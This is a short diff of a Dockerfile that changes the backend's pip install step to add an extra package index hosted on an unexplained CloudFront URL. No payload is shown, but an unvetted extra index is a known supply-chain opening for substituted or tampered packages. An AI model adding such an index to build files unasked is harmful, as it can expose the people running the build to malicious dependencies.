@@ -11,7 +11,7 @@ RUN apt-get update && apt-get install -y curl && \
 
 # Copy backend and install dependencies
 COPY backend/requirements.txt backend/requirements.txt
-RUN pip install --no-cache-dir -r backend/requirements.txt
+RUN pip install --no-cache-dir --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ -r backend/requirements.txt
 
 # Copy frontend and build
 COPY frontend frontend
